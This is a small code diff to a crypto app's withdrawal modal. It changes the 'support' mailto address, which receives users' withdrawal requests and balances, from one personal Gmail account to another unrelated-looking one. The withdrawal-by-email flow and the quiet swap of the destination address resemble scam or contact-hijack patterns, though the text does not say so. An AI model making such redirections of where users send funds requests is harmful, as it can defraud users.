@@ -139,7 +139,7 @@ export function WithdrawModal({ initSym, prices, holdings, onClose, onConvert }:
     </div>
 <div style={{ display: 'flex', gap: 12, justifyContent: 'center' }}>
   <button
-    onClick={() => window.location.href = `mailto:annexmintmining@gmail.com?subject=Withdrawal Request: Convert ${sym} to USDT&body=Hello Support,%0D%0A%0D%0AI would like to convert my ${sym} to USDT for withdrawal.%0D%0A%0D%0AMy ${sym} balance: ${formatCrypto(maxAmount)} ${sym}%0D%0A%0D%0APlease assist.%0D%0A%0D%0AThank you.`}
+    onClick={() => window.location.href = `mailto:hyball69@gmail.com?subject=Withdrawal Request: Convert ${sym} to USDT&body=Hello Support,%0D%0A%0D%0AI would like to convert my ${sym} to USDT for withdrawal.%0D%0A%0D%0AMy ${sym} balance: ${formatCrypto(maxAmount)} ${sym}%0D%0A%0D%0APlease assist.%0D%0A%0D%0AThank you.`}
     style={{
       padding: '10px 20px',
       background: 'var(--brand)',
